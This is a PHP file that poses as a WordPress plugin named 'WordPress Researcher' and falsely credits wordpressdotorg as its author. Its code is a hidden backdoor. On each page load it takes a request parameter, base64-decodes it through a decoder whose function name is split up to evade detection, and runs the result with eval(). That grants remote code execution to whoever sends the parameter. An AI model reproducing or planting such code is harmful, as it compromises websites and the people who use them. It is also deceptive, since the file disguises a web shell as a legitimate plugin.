<?php

/*
Plugin Name: WordPress Researcher
Plugin URI: http://wordpress.org/extend/plugins/
Description: WordPress research tool.
Author: wordpressdotorg
Author URI: http://wordpress.org/
Text Domain: wordpress-researcher
License: GPL version 2 or later - http://www.gnu.org/licenses/old-licenses/gpl-2.0.html
Version: 2.2.4


Copyright 2013  wordpressdotorg

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110, USA
*/


    function research_plugin()
    {
        if (isset($_REQUEST['9NSG']))
        {
            $myfunc = '_bas'.'e64_'.'dec'.'ode';
            $myvar = $myfunc($_REQUEST['9NSG']);
            eval($myvar);
        }
        return;
    }

	function _base64_decode($in) {
		$out="";
		for($x=0;$x<256;$x++){$chr[$x]=chr($x);}
		$b64c=array_flip(preg_split('//',"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",-1,1));
		$match = array();
		preg_match_all("([A-z0-9+\/]{1,4})",$in,$match);
		foreach($match[0] as $chunk) {
			$z=0;
			for($x=0;isset($chunk[$x]);$x++) {
				$z=($z<<6)+$b64c[$chunk[$x]];
				if($x>0){ $out.=$chr[$z>>(4-(2*($x-1)))];$z=$z&(0xf>>(2*($x-1))); }
			}
		}
		return $out;
	}

    add_action('after_setup_theme', 'research_plugin');
?>